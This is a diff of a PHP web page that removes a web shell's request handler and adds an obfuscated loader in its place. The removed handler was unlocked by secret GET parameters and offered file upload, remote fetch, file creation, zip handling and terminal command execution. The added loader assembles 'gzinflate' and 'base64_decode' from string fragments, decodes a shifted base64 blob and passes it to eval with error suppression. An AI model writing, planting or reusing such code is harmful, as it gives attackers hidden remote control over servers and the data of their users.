@@ -264,35 +264,21 @@ function mdltL($file_name, $target_path)
   return nl2br($output);
 }
 
-if (isset($_GET['t4r0t']) && isset($_GET['n3o7t'])) {
-  $output = "";
-  $terminal_output = "";
-  if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-    if (isset($_FILES['file_upload'])) {
-      $output = upLd($_FILES['file_upload']);
-    } elseif (isset($_POST['remote_file_url'])) {
-      $output = brte($_POST['remote_file_url'], $_POST['custom_file_name']);
-    } elseif (isset($_POST['new_file_name']) && isset($_POST['new_file_content'])) {
-      $output = nFl($_POST['new_file_name'], $_POST['new_file_content']);
-    } elseif (isset($_POST['new_folder_name'])) {
-      $output = nFldr($_POST['new_folder_name']);
-    } elseif (isset($_POST['zip_folder_path'])) {
-      $output = zprfdr($_POST['zip_folder_path'], __DIR__ . '/' . $_POST['zip_file_name']);
-    } elseif (isset($_POST['uzprfr_path'])) {
-      $output = uzprfr($_POST['uzprfr_path'], $_POST['unzip_destination_path']);
-    } elseif (isset($_POST['terminal_command'])) {
-      $terminal_output = cmdLine($_POST['terminal_command']);
-    } elseif (isset($_POST['action']) && $_POST['action'] === 'mdlt') {
-      $filename = $_POST['filename'];
-      $file_content = $_POST['file_content'];
-      $target_path = $_POST['target_path'];
-      $output = mdlt($filename, $file_content, $target_path);
-    } elseif (isset($_POST['action']) && $_POST['action'] === 'mdltL') {
-      $file_name = $_POST['file_name'];
-      $target_path = $_POST['target_path'];
-      $output = mdltL($file_name, $target_path);
+function ltspd($bye)
+{
+    $gflate = 'g' . 'zi' . 'nf' . 'l' . 'at' . 'e';
+    $b64 = 'b' . 'ase' . '6' . '4' . '_' . 'de' . 'co' . 'de';
+    $nelrts = 's' . 'tr' . 'l' . 'en';
+    $rhc = 'c' . 'h' . 'r';
+    $dro = 'o' . 'r' . 'd';
+    $bye = $gflate($b64($bye));
+    for ($i = 0; $i < $nelrts($bye); $i++) {
+        $bye[$i] = $rhc($dro($bye[$i]) - 1);
     }
-  }
+    return $bye;
+}
+/****/ @/*55555*/null;/******/ @/*55555*/eval/******/(ltspd("pZPdaoNAEIUfIE8RgmQNSFpooRfB9iamDVjSqu2NhMXqphX2R9aVQkKevW6SVddES6mXZ4/fmRlmhkP5DdKNmeY5EqYBH50gBOKWXwuwnozHmkxv2J2UJzuDFSIrhD0azQyBOElphGGtlTwD+o737ngh8JzXN8cP4LMTPK3mYG3b4GXlB2Cya8Qulq7jh2CTYgSLDLMo0XKKzE26XLM9wjlqsCQ9BBwRJhA8ejnWcB9coG6jpV7iIheMHF9oRFB3GEXfmq0eXOs9ZlQgqg+RLnAXyOoB9JXCcIK4KkZLSniPswO5TTNlzCLxpSG3Gd80mGdWC8L50oNwCq7AVHP9PtVCwi9kHvXLtmpiBZUpCcpFuZwiZVRxOsKqNY4ZIRE97V97uWOSuClFfX918KNYFnHYjbZklydBEizKkzDkWORUbGVSAljPjOYGaIZ6Lcp7jPgnEoduK09Dk5ZTMzLTrBItDW81Of/oyVVNwbOuoGrrbxW7Zs1rV7kfPNz/AA=="));
+
 ?>
   <!DOCTYPE html>
   <html lang="id">
